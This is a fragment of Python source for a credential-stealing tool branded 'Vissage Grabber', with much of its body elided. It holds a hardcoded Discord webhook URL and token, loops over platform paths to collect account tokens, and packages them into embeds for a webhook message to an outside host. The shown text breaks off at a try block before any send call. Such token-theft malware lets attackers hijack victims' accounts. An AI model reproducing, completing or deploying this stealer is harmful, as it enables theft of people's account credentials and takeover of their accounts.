...
webhook_url = "https://discord.com/api/webhooks/937390651555872768/2A75jxbMVKKGMpp0uV3abTGBMSAOTl2uHu0OiU2XfpN7HOtjI_8frpBTyeke34crM0Vb"
...
def main():
    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            embed = {
                ...
                "footer": {
                    "text": "Vissage Grabber by west⁶#0001・https://github.com/Vissage-Security-Team"
                }
            }
            embeds.append(embed)
    ...
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Vissage Grabber",
        "avatar_url": "https://cdn.discordapp.com/avatars/831292832035110922/b32a141b26f26d19b88410eb3b79d080.webp?size=56"
    }
    try:
